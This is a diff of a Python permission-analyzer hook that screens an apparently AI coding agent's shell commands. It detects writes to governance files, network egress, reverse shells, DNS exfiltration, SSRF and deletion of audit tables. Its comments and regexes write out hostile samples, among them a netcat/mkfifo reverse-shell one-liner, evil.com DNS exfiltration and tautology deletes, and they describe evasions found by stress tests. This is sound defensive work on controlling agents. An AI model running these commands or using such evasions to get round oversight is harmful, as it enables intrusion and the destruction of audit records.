+_COPY_FAMILY_RE = re.compile(r"^(?:sudo\s+)?(?:[\w./-]*/)?(?:cp|install|ln)\b")
+_COPY_TARGET_DIR_FLAGS = ("-t", "--target-directory")
+_CMD_SEPARATOR_RE = re.compile(r"[;|\n&]")
+
+
+def _copy_family_destinations(cmd: str) -> list[str] | None:
+    """Los operandos de DESTINO de un copiador de shell simple, o None.
+
+    None significa "no se puede afirmar cual es el destino" y conserva el
+    comportamiento anterior (todo el comando es candidato). Solo se estrecha una
+    forma demostrablemente simple: una sola invocacion, sin separadores de
+    comando, sin sustitucion, heredoc, shell anidada ni comilla sin cerrar.
+    """
+    if _OPAQUE_SHELL_RE.search(cmd) or cmd.count("'") % 2 or cmd.count('"') % 2:
+        return None
+    if _CMD_SEPARATOR_RE.search(cmd):
+        return None
+    if re.search(r"[<>]", cmd):
+        return None  # redirection operator: destination unclear, fall back to whole-command match (panel-review 2026-08-21, P1)
+    collapsed = _collapse_adjacent_quotes(cmd).strip()
+    if not _COPY_FAMILY_RE.match(collapsed):
+        return None
+    toks = [t for t in (x.strip().strip("'\"") for x in _BASH_TOKEN_SPLIT_RE.split(collapsed)) if t]
+    operands = []
+    i = 2 if toks[0] == "sudo" else 1
+    while i < len(toks):
+        tok = toks[i]
+        if tok in _COPY_TARGET_DIR_FLAGS:
+            return toks[i + 1 : i + 2] or None
+        if tok.startswith("-t") and tok != "-t":
+            return None  # `-tDIR` pegado: el destino no es el ultimo operando
+        if tok.startswith("-"):
+            i += 1
+            continue
+        operands.append(tok)
+        i += 1
+    return operands[-1:] or None
+
+
+def _mask_heredoc_bodies(cmd: str) -> str:
+    """Replaces every heredoc BODY (the data between `<<MARKER` and its closing
+    `MARKER` line) with a neutral placeholder, leaving the rest of `cmd` untouched.
+
+    A heredoc body is inert data handed to whatever command precedes the `<<`
+    operator — it can never itself be a shell redirection target or command token,
+    so it can never be the thing a write actually targets. The real destination of
+    a write (a `>`/`>>` operand, a `cp`/`mv` argument, …) always appears *outside*
+    the body, before the `<<` operator, and is untouched by this masking — only
+    masks arbitrary payload text (prose, code, documentation) that would otherwise
+    reach the raw-command substring-match fallback below.
+
+    Root cause of a real false positive (found 2026-09-02): `cat >> progress.md
+    <<'EOF' ... citing ".claude/hooks/permission_analyzer.py" in prose ... EOF`
+    was read as if it targeted the governance corpus, despite writing to an
+    unrelated gitignored file in a different repo — the *raw command text*
+    fallback (below) doesn't distinguish "a path mentioned in data being written
+    elsewhere" from "the actual write destination"; `_bounded_token_in`'s word-
+    boundary check (2026-09-02, same day) closes the analogous false positive for
+    inline code but a governance-path-*shaped* citation in prose is still
+    word-boundary-bounded, so that check alone doesn't catch this case. Same
+    heredoc grammar as `_PY_HEREDOC_RE`/`_JS_HEREDOC_RE`; a separate constant,
+    not a shared import — masking arbitrary data for a substring-match fallback is
+    a different job from extracting Python/JS *code* payloads for AST inspection,
+    and coupling the two risks one caller's future needs silently changing the
+    other's behavior.
+    """
+    # A heredoc feeding an interpreter (python3/node) is CODE, not inert data --
+    # a write inside it (open(path, "w").write(...)) is a real write target, and
+    # the later interpreter-code-judgment check (_interpreter_code_is_active +
+    # _mentions_protected_path) is strictly less strict (ESCALATE, not DENY) than
+    # the early BLOCKED_PATHS token match this masking would otherwise suppress.
+    # Found 2026-09-02 by this fix's own regression run
+    # (test_real_redirect_write_to_protected_path_still_caught): masking
+    # unconditionally downgraded `python3 - <<'PY'\nopen('/root/dqiii8/CLAUDE.md',
+    # 'w').write('x')\nPY` from DENY to ESCALATE. Skip masking entirely for these.
+    if _PY_CMD_RE.search(cmd) or _JS_CMD_RE.search(cmd):
+        return cmd
+    out = cmd
+    for m in reversed(list(_HEREDOC_BODY_RE.finditer(cmd))):
+        out = out[: m.start(3)] + "HEREDOC_BODY_OMITTED" + out[m.end(3) :]
+    return out
+
+
+_HEREDOC_BODY_RE = re.compile(r"<<-?\s*(['\"]?)(\w+)\1\r?\n(.*?)\r?\n\2(?:\s|$)", re.S)
+
+
+def _bash_resolved_write_targets(
+    cmd: str, restrict_to: list[str] | None = None, cwd_override: str | None = None
+) -> list[str]:
     """Strings to test against BLOCKED_PATHS/GOVERNANCE_PATHS for a Bash
     write: the raw command (cheap, catches the common case), the quote/
     backslash-collapsed command ('CLA''UDE.md' / 'CLA\\UDE.md'
     evaded the raw-string match), and every relative path-shaped token
     resolved against the command's effective cwd (a `cd`
     prefix changes what a bare relative token actually targets).
+
+    The raw/collapsed candidates have their heredoc BODIES masked first
+    (_mask_heredoc_bodies) — arbitrary data written elsewhere is not itself a
+    write target, and scanning it as if it were false-positives on any
+    incidental path-shaped mention inside prose/code/docs (2026-09-02).
     """
     collapsed = _collapse_adjacent_quotes(cmd)
-    cwd = _bash_effective_cwd(collapsed)
+    cwd = cwd_override if cwd_override is not None else _bash_effective_cwd(collapsed)
     assigns = _shell_assignments(collapsed)
-    out = [cmd, collapsed]
-    out.extend(_archive_dest_dirs(collapsed))
-    for raw_tok in _BASH_TOKEN_SPLIT_RE.split(collapsed):
+    # masked_collapsed feeds every path-candidate surface below (the token walk
+    # included) — cwd/assigns keep using the real `collapsed` since a `cd`/`VAR=`
+    # prefix is control-flow, never inside a heredoc body. Fix 2026-09-02: the
+    # token walk used to run on unmasked `collapsed`, so a path-shaped word inside
+    # heredoc body prose still tokenized and resolved as a candidate — defeating
+    # the whole-string masking above it for exactly the same false positive.
+    masked_collapsed = _mask_heredoc_bodies(collapsed)
+    # A3b: con restrict_to, el comando crudo deja de ser candidato — el llamante
+    # ya ha determinado que lo unico que se escribe es ese destino.
+    out = (
+        []
+        if restrict_to is not None
+        else [_mask_heredoc_bodies(cmd), masked_collapsed]
+    )
+    if restrict_to is None:
+        out.extend(_archive_dest_dirs(masked_collapsed))
+    for raw_tok in _BASH_TOKEN_SPLIT_RE.split(masked_collapsed):
         tok = raw_tok.strip().strip("'\"")
         if not tok or tok.startswith("-"):
+            continue
+        if restrict_to is not None and tok not in restrict_to:
             continue
         if "$" in tok:
             tok = _expand_shell_vars(tok, assigns)
@@ -746,9 +1349,7 @@ def _bash_resolved_write_targets(cmd: str) -> list[str]:
             continue
         elif tok.startswith("$"):
             continue
-        resolved = os.path.normpath(
-            tok if tok.startswith("/") else os.path.join(cwd, tok)
-        )
+        resolved = os.path.normpath(tok if tok.startswith("/") else os.path.join(cwd, tok))
         out.append(resolved)
         # Directory entries in BLOCKED_PATHS/GOVERNANCE_PATHS carry a trailing
         # separator ('.git/', '.claude/hooks/') so they cannot match a
@@ -765,13 +1366,31 @@ def _bash_resolved_write_targets(cmd: str) -> list[str]:
 # does a glob-shaped Bash token ('CLAUD?.md', '*.local.json') expand onto a
 # protected basename? Split into two probe sets, same DENY-wins-except-
 # settings.local.json precedence as _blocked_path_hit/_governance_path_hit.
-_BLOCKED_GLOB_PROBES = tuple(sorted({
-    p.rstrip("/").rsplit("/", 1)[-1]
-    for p in BLOCKED_PATHS if p.rstrip("/") and p not in GOVERNANCE_PATHS
-}))
-_GOVERNANCE_GLOB_PROBES = tuple(sorted({
-    p.rstrip("/").rsplit("/", 1)[-1] for p in GOVERNANCE_PATHS if p.rstrip("/")
-}))
+# Recomputed per call, not cached: a cached tuple would not see a test's
+# monkeypatch of _BREAKGLASS_CACHE. ~30 short strings; fnmatch dominates.
+def _blocked_glob_probes() -> tuple[str, ...]:
+    down = _downgraded()
+    return tuple(
+        sorted(
+            {
+                p.rstrip("/").rsplit("/", 1)[-1]
+                for p in BLOCKED_PATHS
+                if p.rstrip("/") and p not in GOVERNANCE_PATHS and p not in down
+            }
+        )
+    )
+
+
+def _governance_glob_probes() -> tuple[str, ...]:
+    return tuple(
+        sorted(
+            {
+                p.rstrip("/").rsplit("/", 1)[-1]
+                for p in (*GOVERNANCE_PATHS, *_downgraded())
+                if p.rstrip("/")
+            }
+        )
+    )
 
 
 def _blocked_glob_hit(token: str) -> str | None:
@@ -781,7 +1400,7 @@ def _blocked_glob_hit(token: str) -> str | None:
     if not token or not _GLOB_WILDCARD_RE.search(token):
         return None
     base = token.replace("\\", "/").rsplit("/", 1)[-1]
-    for probe in _BLOCKED_GLOB_PROBES:
+    for probe in _blocked_glob_probes():
         if probe and fnmatch.fnmatchcase(probe, base):
             return probe
     return None
@@ -793,7 +1412,7 @@ def _governance_glob_hit(token: str) -> str | None:
     if not token or not _GLOB_WILDCARD_RE.search(token):
         return None
     base = token.replace("\\", "/").rsplit("/", 1)[-1]
-    for probe in _GOVERNANCE_GLOB_PROBES:
+    for probe in _governance_glob_probes():
         if probe and fnmatch.fnmatchcase(probe, base):
             return probe
     return None
@@ -877,10 +1496,19 @@ def _opaque_blob_hit(url: str) -> str | None:
     return None
 
 
-def _host_egress_risk(host: str) -> tuple[str, str] | None:
+def _host_egress_risk(host: str, port: int | None = None) -> tuple[str, str] | None:
     """Classify a URL host. Returns (severity_kind, token) or None.
 
     severity_kind ∈ {"sink", "metadata", "private"}.
+
+    port=9333 on a loopback/localhost host is PERMIT, not escalate: the
+    user's own CDP tunnel to their local Chrome, opened by their own
+    decision (2026-08-21). port=8080 on loopback is PERMIT too
+    (2026-09-04): the user's own DQIII8 dashboard (bin/ui/dashboard.py,
+    HOST=127.0.0.1, PORT=8080 by default), needed for iterative dashboard
+    design work (screenshots, live verification) without an ESCALATE on
+    every single request. Every other private/loopback/metadata
+    classification, and localhost on any other port, is unaffected.
     """
     if not host:
         return ("private", "<empty-host>")
@@ -893,7 +1521,11 @@ def _host_egress_risk(host: str) -> tuple[str, str] | None:
     # "private" — the short-circuit let http://2852039166/ (169.254.169.254,
     # cloud metadata) downgrade from DENY to ESCALATE (found by stress test,
     # 2026-08-11).
-    _int_base = 16 if host.startswith("0x") else (8 if re.fullmatch(r"0[0-7]+", host) else (10 if host.isdigit() else None))
+    _int_base = (
+        16
+        if host.startswith("0x")
+        else (8 if re.fullmatch(r"0[0-7]+", host) else (10 if host.isdigit() else None))
+    )
     if _int_base is not None:
         try:
             host = str(ipaddress.ip_address(int(host, _int_base)))
@@ -905,6 +1537,8 @@ def _host_egress_risk(host: str) -> tuple[str, str] | None:
         if host == "localhost" or host.endswith(
             (".localhost", ".local", ".internal", ".localdomain")
         ):
+            if port in (9333, 8080):
+                return None
             return ("private", host)
         return None
     if ip.is_link_local:
@@ -912,6 +1546,8 @@ def _host_egress_risk(host: str) -> tuple[str, str] | None:
         # legitimate research target, always an SSRF credential grab.
         return ("metadata", host)
     if ip.is_loopback or ip.is_private or ip.is_reserved or ip.is_unspecified:
+        if port in (9333, 8080) and ip.is_loopback:
+            return None
         return ("private", host)
     return None
 
@@ -1015,6 +1651,73 @@ _BLOB_ALNUM_RE = re.compile(r"^[A-Za-z0-9]+$")
 # interactive editors, and curl/wget's own output-to-file flags, all of
 # which write without any of ">"/"tee"/"truncate" appearing.
 _BASH_WRITE_SIGNS = [">", ">>", "tee ", "sed -i", "truncate "]
+
+# 2026-08-20 (A1): el ">" de _BASH_WRITE_SIGNS es un substring, asi que
+# `2>/dev/null`, `2>&1` y `>&2` marcaban como ESCRITURA cualquier lectura que
+# los llevara — y el comando heredaba entonces el veredicto de cualquier ruta
+# protegida que solo estuviera mencionando (`grep x .claude/hooks/stop.py
+# 2>/dev/null` -> ESCALATE). Una redireccion a /dev/null o a un descriptor no
+# escribe ningun fichero que un chequeo de rutas pueda proteger.
+#
+# ADITIVO, NUNCA SUSTITUTIVO: esto solo retira la señal derivada de ">". Los
+# demas signos de la lista, y las tres capas independientes de deteccion de
+# escritura de mas abajo (cp/mv/rsync/install/ln/dd; patch/git apply/git
+# checkout --/tar -x/unzip/ed; _BASH_WRITE_SIGN_PATTERNS) siguen intactas — por
+# eso `cp x <gobernanza> 2>/dev/null` sigue escalando.
+_INERT_REDIR_TARGETS = ("/dev/null",)
+_OPAQUE_SHELL_RE = re.compile(r"\$\(|`|<<|\$\{|\beval\b|\b(?:ba|z|k|da)?sh\s+-[a-zA-Z]*c\b")
+
+
+def _redirections_all_inert(cmd: str) -> bool:
+    """True solo si se puede dar cuenta de cada ">" y ninguno escribe un fichero.
+
+    Conservador por construccion: ante cualquier duda devuelve False, que deja
+    el comportamiento anterior. Nunca amplia lo que se considera inerte.
+    """
+    if _OPAQUE_SHELL_RE.search(cmd) or cmd.count("'") % 2 or cmd.count('"') % 2:
+        return False
+    i, n, seen = 0, len(cmd), False
+    while i < n:
+        if cmd[i] != ">":
+            i += 1
+            continue
+        seen = True
+        j = i + 1
+        if j < n and cmd[j] == ">":
+            j += 1
+        while j < n and cmd[j] in " \t":
+            j += 1
+        if j < n and cmd[j] == "&":
+            # dup de descriptor (`2>&1`, `>&2`, `2>&-`): se resuelve aparte
+            # porque "&" es tambien separador de comandos, asi que el barrido
+            # de token de abajo lo cortaria a cadena vacia.
+            k = j + 1
+            while k < n and cmd[k].isdigit():
+                k += 1
+            if k == j + 1:
+                if k < n and cmd[k] == "-":
+                    k += 1
+                else:
+                    return False  # `>&fichero` escribe de verdad
+            i = k
+            continue
+        k = j
+        while k < n and cmd[k] not in " \t|;&\n":
+            k += 1
+        if cmd[j:k] not in _INERT_REDIR_TARGETS:
+            return False
+        i = k
+    return seen
+
+
+def _bash_write_sign_hit(cmd: str) -> bool:
+    if any(sign in cmd for sign in _BASH_WRITE_SIGNS if sign not in (">", ">>")):
+        return True
+    if ">" not in cmd:
+        return False
+    return not _redirections_all_inert(cmd)
+
+
 _BASH_WRITE_SIGN_PATTERNS = [
     re.compile(r"\bsed\b[^|;&\n]*\s(?:-i|--in-place)\b"),
     re.compile(r"\bperl\b[^|;&\n]*\s-\w*i\w*\b"),
@@ -1083,6 +1786,7 @@ def _rm_destructive_targets(cmd: str) -> list[str]:
                 hits.append(tgt)
     return hits
 
+
 # context-mode MCP server (2026-08-18): allow-listed in
 # settings.local.json, arbitrary sandboxed code/subprocess execution, and its
 # own tool descriptions actively steer callers here instead of Bash ("PREFER
@@ -1090,11 +1794,13 @@ def _rm_destructive_targets(cmd: str) -> list[str]:
 # through any Bash-equivalent check. ctx_fetch_and_index/ctx_search are read/
 # query-shaped by name and are deliberately left out — only the three
 # confirmed exec-capable tools are covered.
-_CTX_MODE_EXEC_TOOLS = frozenset({
-    "mcp__context-mode__ctx_execute",
-    "mcp__context-mode__ctx_execute_file",
-    "mcp__context-mode__ctx_batch_execute",
-})
+_CTX_MODE_EXEC_TOOLS = frozenset(
+    {
+        "mcp__context-mode__ctx_execute",
+        "mcp__context-mode__ctx_execute_file",
+        "mcp__context-mode__ctx_batch_execute",
+    }
+)
 
 
 def _ctx_mode_command_text(tool: str, inp: dict) -> str:
@@ -1139,6 +1845,9 @@ _NETWORK_EGRESS_BASH_RE = re.compile(
     r"|urllib\.request|requests\.(?:post|get|put|patch)\b|httpx\."
     r"|socket\.(?:socket|connect|create_connection)"
     r"|http\.client|aiohttp|/dev/(?:tcp|udp)/"
+    # A7: node abria sockets sin entrar aqui. `fetch\(` exige parentesis,
+    # asi que `git fetch origin` no casa.
+    r"|fetch\(|require\(['\"](?:node:)?(?:http|https|net|dgram|tls)['\"]\)"
 )
 _SENSITIVE_ENV_VAR_RE = re.compile(
     r"\$\{?[A-Z][A-Z0-9_]*(?:_KEY|_TOKEN|_SECRET|_PASSWORD|_PASSWD)\}?\b"
@@ -1169,8 +1878,7 @@ _PIPE_TO_SHELL_RE = re.compile(
 # _NETWORK_EGRESS_BASH_RE: -T/--upload-file, and -F/--form with an @-file
 # attachment (curl reads the file named after '@' and sends its bytes).
 _UPLOAD_FORM_RE = re.compile(
-    r"\bcurl\b[^|;\n]*\s(?:-T\b|--upload-file\b)"
-    r"|\bcurl\b[^|;\n]*\s(?:-F\b|--form\b)[^|;\n]*=@"
+    r"\bcurl\b[^|;\n]*\s(?:-T\b|--upload-file\b)" r"|\bcurl\b[^|;\n]*\s(?:-F\b|--form\b)[^|;\n]*=@"
 )
 # [S6] A local archive/compress/encode tool piped straight into a network
 # command — the compressed/encoded bytes never touch disk as a named file,
@@ -1277,6 +1985,25 @@ def _interpreter_socket_shell_hit(cmd: str) -> bool:
     )
 
 
+_MKFIFO_RE = re.compile(r"\bmkfifo\b")
+_NC_TOKEN_RE = re.compile(r"\b(?:nc|ncat|netcat)\b")
+
+
+def _mkfifo_backpipe_hit(cmd: str) -> bool:
+    """True if cmd creates a named pipe (mkfifo) AND invokes nc/ncat/netcat
+    anywhere in the same command, regardless of order or which side of the
+    pipe reads from/writes to the fifo (2026-09-04, live audit).
+    _REVERSE_SHELL_RE's own mkfifo branch only matches the 'nc ... < fifo'
+    direction (nc reading from the fifo); the equally common, textbook
+    '... | nc ... > fifo' shape (nc writing back into the fifo, closing the
+    backpipe loop) walked straight through undetected — confirmed live with
+    'mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc HOST PORT > /tmp/f'.
+    No legitimate use combines a named pipe with netcat in one command, so
+    this is order-independent by design rather than trying to enumerate
+    every direction."""
+    return bool(_MKFIFO_RE.search(cmd)) and bool(_NC_TOKEN_RE.search(cmd))
+
+
 # [guardrails-security round 2, 2026-08-19] `host $(...).evil.com` /
 # `nslookup $(...).evil.com` — a DNS-lookup argument built from a command
 # substitution is DNS-tunnel exfil almost by definition (an ordinary lookup
@@ -1286,9 +2013,7 @@ def _interpreter_socket_shell_hit(cmd: str) -> bool:
 # words and command names alike, so gating this on the token alone (rather
 # than the token plus a command-substitution argument) would false-positive
 # on unrelated commands that merely mention "host".
-_DNS_EXFIL_RE = re.compile(
-    r"\b(?:host|nslookup|dig)\b[^|;\n]*(?:\$\(|`)"
-)
+_DNS_EXFIL_RE = re.compile(r"\b(?:host|nslookup|dig)\b[^|;\n]*(?:\$\(|`)")
 # [RT12] os.system/os.popen hand a full shell command to the OS; pty.spawn
 # starts an interactive shell; eval/exec/compile run arbitrary Python source.
 # All four are execution primitives, not just write primitives — folded
@@ -1317,7 +2042,7 @@ def _py_inline_call_first_arg(cmd: str, paren_open_idx: int) -> str | None:
         i += 1
     if depth:
         return None
-    arg_blob = cmd[start:i - 1]
+    arg_blob = cmd[start : i - 1]
     # First top-level comma splits off the first argument.
     depth = 0
     for j, ch in enumerate(arg_blob):
@@ -1330,9 +2055,7 @@ def _py_inline_call_first_arg(cmd: str, paren_open_idx: int) -> str | None:
     return arg_blob.strip()
 
 
-_PY_STRING_LITERAL_RE = re.compile(
-    r"""^(?:r|b|rb|br)?(['"]).*\1$""", re.IGNORECASE | re.DOTALL
-)
+_PY_STRING_LITERAL_RE = re.compile(r"""^(?:r|b|rb|br)?(['"]).*\1$""", re.IGNORECASE | re.DOTALL)
 
 
 def _py_arg_is_resolvable(arg: str) -> bool:
@@ -1349,6 +2072,7 @@ def _py_arg_is_resolvable(arg: str) -> bool:
     if re.match(r"^(?:f|fr|rf)['\"]", arg, re.IGNORECASE):
         return False
     return bool(_PY_STRING_LITERAL_RE.match(arg))
+
 
 # Always CRITICAL regardless of mode.
 # The literal 'rm -rf /' entries are handled separately by
@@ -1379,7 +2103,9 @@ _CRITICAL_PATTERN_LABELS = {
     CRITICAL_PATTERNS[1]: "filesystem format (mkfs)",
     CRITICAL_PATTERNS[2]: "dd to/from a raw disk device",
     CRITICAL_PATTERNS[3]: "tee into a raw disk device",
-    CRITICAL_PATTERNS[4]: "disk-scrubbing tool (wipefs/parted/sfdisk/fdisk/blkdiscard/shred) on a raw device",
+    CRITICAL_PATTERNS[
+        4
+    ]: "disk-scrubbing tool (wipefs/parted/sfdisk/fdisk/blkdiscard/shred) on a raw device",
     CRITICAL_PATTERNS[5]: "redirect into a disk-by-id alias",
     CRITICAL_PATTERNS[6]: "fork bomb",
 }
@@ -1397,7 +2123,9 @@ _CRITICAL_PATTERN_LABELS = {
 # Best-effort regex, not a SQL parser — same stance as _SQL_PATHISH_RE above:
 # the well-known no-op predicate shapes are pattern-matched, nothing more.
 _SQL_TABLE_PREFIX = r"(?:[\"'`\[]?\w+[\"'`\]]?\s*\.\s*)?[\"'`\[]?"
-_PROTECTED_AUDIT_TABLES = r"(?:agent_actions|permission_decisions|session_memory|instincts|sqlite_master|sqlite_schema)"
+_PROTECTED_AUDIT_TABLES = (
+    r"(?:agent_actions|permission_decisions|session_memory|instincts|sqlite_master|sqlite_schema)"
+)
 _PROTECTED_MUTATION_TABLES = r"(?:learned_approvals|permission_decisions|agent_actions|instincts|sqlite_master|sqlite_schema)"
 # Predicates that bound nothing. Ordered most-specific-first so `WHERE 1=1`
 # never falls through to the bare-`WHERE 1` branch.
@@ -1407,19 +2135,22 @@ _SQL_PREDICATE_END = r"(?:\s*(?:;|--|/\*|\)|[\"'`]|$))"
 
 _SQL_TAUTOLOGY = (
     r"(?:"
-    r"[\"'`]?\s*1\s*[\"'`]?\s*(?:==|=)\s*[\"'`]?\s*1\s*[\"'`]?"   # 1=1, '1'='1', "1"="1"
-    r"|1\s*(?:<>|!=)\s*0"                                          # 1<>0, 1!=0
-    r"|TRUE\b"                                                     # WHERE TRUE
-    r"|(['\"])([^'\"]*)\1\s*=\s*\1\2\1"                            # 'a'='a' — same literal both sides
-    r"|\b(\w+)\s*=\s*\3\b"                                         # col = col
-    r"|1\s*(?:;|--|/\*|\)|$)"                                      # WHERE 1  (no column at all)
+    r"[\"'`]?\s*1\s*[\"'`]?\s*(?:==|=)\s*[\"'`]?\s*1\s*[\"'`]?"  # 1=1, '1'='1', "1"="1"
+    r"|1\s*(?:<>|!=)\s*0"  # 1<>0, 1!=0
+    r"|TRUE\b"  # WHERE TRUE
+    r"|(['\"])([^'\"]*)\1\s*=\s*\1\2\1"  # 'a'='a' — same literal both sides
+    r"|\b(\w+)\s*=\s*\3\b"  # col = col
+    r"|1\s*(?:;|--|/\*|\)|$)"  # WHERE 1  (no column at all)
     # Semantic no-ops (2026-08-18, round-4 gap). Each is anchored to the end of
     # the predicate (_SQL_PREDICATE_END) so it only fires when the shape *is*
     # the whole WHERE clause — `WHERE id > -1 AND agent='x'` is genuinely
     # bounded and must stay APPROVE.
-    r"|\w+\s+IS\s+NOT\s+NULL" + _SQL_PREDICATE_END                 # id IS NOT NULL — true for every PK row
-    + r"|\w+\s*(?:>=|>)\s*-\s*\d+" + _SQL_PREDICATE_END            # id > -1, id >= -999 — true for any non-negative id
-    + r"|\w+\s*(?:<>|!=)\s*-\s*\d+" + _SQL_PREDICATE_END           # id <> -1 — ditto
+    r"|\w+\s+IS\s+NOT\s+NULL"
+    + _SQL_PREDICATE_END  # id IS NOT NULL — true for every PK row
+    + r"|\w+\s*(?:>=|>)\s*-\s*\d+"
+    + _SQL_PREDICATE_END  # id > -1, id >= -999 — true for any non-negative id
+    + r"|\w+\s*(?:<>|!=)\s*-\s*\d+"
+    + _SQL_PREDICATE_END  # id <> -1 — ditto
     + r")"
 )
 # NOTE: the two branches above use backreferences, so _SQL_TAUTOLOGY may only
@@ -1448,7 +2179,9 @@ _SQL_TAUTOLOGY = (
 # function rather than a HIGH_RISK_PATTERNS entry because a regex cannot decide
 # whether `5>=5` is true.
 _SQL_LITERAL_COMPARE_RE = re.compile(
-    r"DELETE\s+FROM\s+" + _SQL_TABLE_PREFIX + _PROTECTED_AUDIT_TABLES
+    r"DELETE\s+FROM\s+"
+    + _SQL_TABLE_PREFIX
+    + _PROTECTED_AUDIT_TABLES
     + r"\b[\"'`\]]?\s+WHERE\s+(\d+)\s*(>=|<=|<>|!=|==|=|>|<)\s*(\d+)"
     + _SQL_PREDICATE_END,
     re.IGNORECASE,
@@ -1496,7 +2229,8 @@ def _strip_sql_comments(sql: str) -> str:
 
 
 _DB_CLIENT_SQL_ARG_RE = re.compile(
-    r'\b(?:sqlite3|psql|mysql|mariadb)\b(?:\s+(?!["\'])\S+)*\s+(["\'])(.*?)\1', re.DOTALL
+    r'\b(?:sqlite3|psql|mysql|mariadb)\b(?:\s+(?!["\'])\S+)*\s+(["\'])(.*?)\1',
+    re.DOTALL,
 )
 
 
@@ -1508,6 +2242,55 @@ def _bash_db_client_sql_text(cmd: str) -> str:
     literal (`'.claude/settings.json'` inside a "..."-quoted argument)."""
     m = _DB_CLIENT_SQL_ARG_RE.search(cmd)
     return m.group(2) if m else ""
+
+
+# ── DB-path scoping for the SQL protected-table checks (2026-09-04) ─────────
+# The protected-table regexes below (DROP TABLE/mutate_protected_table/etc)
+# used to match on raw command TEXT alone, with no notion of which DB file a
+# Bash sqlite3/psql/mysql/mariadb/duckdb invocation actually targets — a
+# sandbox/test DB that happens to also define a table named agent_actions
+# (or literally any DB other than production) was DENIED identically to a
+# real attack on the live audit trail (2026-09-04 false positive, reproduced
+# live). Scoped to Bash only: MCP tools (mcp__dqiii8-db__*, ctx_execute) have
+# no comparable path argument to sniff and ALWAYS target the real DB by
+# construction, so they get no exemption here — untouched, still protected
+# unconditionally. Ambiguous cases (no recognised DB-client invocation, or a
+# flag/non-literal in the path-argument position) fail CLOSED — the
+# protection stays active — per this file's existing house style.
+_DB_CLIENT_PATH_ARG_RE = re.compile(
+    r'\b(?:sqlite3|psql|mysql|mariadb|duckdb)\b\s+(?!["\'])(\S+)'
+)
+
+
+def _bash_db_client_target_path(cmd: str) -> str | None:
+    """The DB path argument of a recognised DB-client Bash invocation,
+    resolved against the command's effective cwd, or None if no such
+    positional path argument can be determined (ambiguous — the caller must
+    fail closed and keep protecting)."""
+    m = _DB_CLIENT_PATH_ARG_RE.search(cmd)
+    if not m:
+        return None
+    raw = m.group(1)
+    if raw.startswith("-"):
+        return None
+    cwd = _bash_effective_cwd(cmd)
+    resolved = raw if raw.startswith("/") else os.path.join(cwd, raw)
+    return os.path.normpath(resolved)
+
+
+def _sql_table_check_scoped_to_production(cmd: str) -> bool:
+    """True if a protected-table finding against `cmd` should still apply:
+    either the command isn't a recognised single DB-client invocation with
+    an explicit path argument (ambiguous -> keep protecting), or that path
+    positively resolves to the real production DB_PATH. False only when the
+    path positively resolves to something else."""
+    target = _bash_db_client_target_path(cmd)
+    if target is None:
+        return True
+    try:
+        return _same_file(target, str(DB_PATH))
+    except OSError:
+        return True
 
 
 HIGH_RISK_PATTERNS = [
@@ -1524,13 +2307,24 @@ HIGH_RISK_PATTERNS = [
     # agent_actions (2026-08-18): erasing `permission_decisions` erases the
     # forensic record of this very analyzer's denials *and* starves the
     # repeat-rejection loop-breaker that reads it.
-    (r"DELETE\s+FROM\s+" + _SQL_TABLE_PREFIX + _PROTECTED_AUDIT_TABLES + r"\b[\"'`\]]?(?!\s+WHERE)",
-     "delete_unbounded_audit_table"),
+    (
+        r"DELETE\s+FROM\s+"
+        + _SQL_TABLE_PREFIX
+        + _PROTECTED_AUDIT_TABLES
+        + r"\b[\"'`\]]?(?!\s+WHERE)",
+        "delete_unbounded_audit_table",
+    ),
     # ...and the same delete *with* a WHERE whose predicate is a tautology:
     # `WHERE 1=1` / `WHERE TRUE` / `WHERE 1` delete exactly the same rows as
     # no WHERE at all, and previously APPROVED.
-    (r"DELETE\s+FROM\s+" + _SQL_TABLE_PREFIX + _PROTECTED_AUDIT_TABLES + r"\b[\"'`\]]?\s+WHERE\s+" + _SQL_TAUTOLOGY,
-     "delete_tautology_audit_table"),
+    (
+        r"DELETE\s+FROM\s+"
+        + _SQL_TABLE_PREFIX
+        + _PROTECTED_AUDIT_TABLES
+        + r"\b[\"'`\]]?\s+WHERE\s+"
+        + _SQL_TAUTOLOGY,
+        "delete_tautology_audit_table",
+    ),
     # Any mutating verb against a governance/audit table. `01_database_mutations.md`
     # makes agent_actions/instincts append-only (DB triggers), and
     # learned_approvals/permission_decisions drive the permission decision
@@ -1539,8 +2333,13 @@ HIGH_RISK_PATTERNS = [
     # through bin/core/action_log.py, not raw SQL. sqlite_master/sqlite_schema
     # added 2026-08-18: writing the catalog directly rewrites the schema
     # (and drops triggers) without naming any protected table at all.
-    (r"\b(?:UPDATE|ALTER\s+TABLE|TRUNCATE\s+TABLE|REPLACE\s+INTO|INSERT\s+(?:OR\s+\w+\s+)?INTO)\s+"
-     + _SQL_TABLE_PREFIX + _PROTECTED_MUTATION_TABLES + r"\b", "mutate_protected_table"),
+    (
+        r"\b(?:UPDATE|ALTER\s+TABLE|TRUNCATE\s+TABLE|REPLACE\s+INTO|INSERT\s+(?:OR\s+\w+\s+)?INTO)\s+"
+        + _SQL_TABLE_PREFIX
+        + _PROTECTED_MUTATION_TABLES
+        + r"\b",
+        "mutate_protected_table",
+    ),
     # [S9c] CREATE TABLE ... AS SELECT ... FROM <protected table> copies a
     # protected table's rows into a brand-new, unprotected table — the
     # mutation verbs above only ever look at what comes right after
@@ -1548,11 +2347,24 @@ HIGH_RISK_PATTERNS = [
     # shape had no explicit matcher (only the incidental `*`-wildcard
     # heuristic below, which false-positives on unrelated globs and misses
     # an explicit column list).
-    (r"CREATE\s+TABLE\b[\s\S]*?\bAS\s+SELECT\b[\s\S]*?\bFROM\s+"
-     + _SQL_TABLE_PREFIX + _PROTECTED_MUTATION_TABLES + r"\b", "sql_create_table_as_select_protected"),
-    (r"CREATE\s+TABLE\b[\s\S]*?\bAS\s+SELECT\b[\s\S]*?\bFROM\s+"
-     + _SQL_TABLE_PREFIX + _PROTECTED_AUDIT_TABLES + r"\b", "sql_create_table_as_select_protected"),
-    (r"PRAGMA\s+writable_schema", "pragma_writable_schema"),  # flips SQLite's schema table writable — arbitrary catalog rewrite
+    (
+        r"CREATE\s+TABLE\b[\s\S]*?\bAS\s+SELECT\b[\s\S]*?\bFROM\s+"
+        + _SQL_TABLE_PREFIX
+        + _PROTECTED_MUTATION_TABLES
+        + r"\b",
+        "sql_create_table_as_select_protected",
+    ),
+    (
+        r"CREATE\s+TABLE\b[\s\S]*?\bAS\s+SELECT\b[\s\S]*?\bFROM\s+"
+        + _SQL_TABLE_PREFIX
+        + _PROTECTED_AUDIT_TABLES
+        + r"\b",
